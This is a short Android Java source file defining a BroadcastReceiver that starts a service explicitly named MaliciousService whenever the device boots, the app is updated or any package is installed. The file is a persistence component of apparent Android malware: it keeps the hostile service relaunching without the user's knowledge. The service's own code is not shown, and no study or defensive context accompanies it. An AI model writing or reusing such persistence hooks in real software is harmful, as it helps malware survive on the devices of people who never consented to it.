package com.example.android;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "BootReceiver received intent: " + intent.getAction());
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || 
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction()) ||
            "android.intent.action.PACKAGE_ADDED".equals(intent.getAction())) {
            Log.d(TAG, "Starting MaliciousService from BootReceiver...");
            Intent serviceIntent = new Intent(context, MaliciousService.class);
            try {
                if (context.startService(serviceIntent) != null) {
                    Log.d(TAG, "MaliciousService started successfully.");
                } else {
                    Log.e(TAG, "Failed to start MaliciousService.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error starting MaliciousService: " + e.getMessage(), e);
            }
        }
    }
}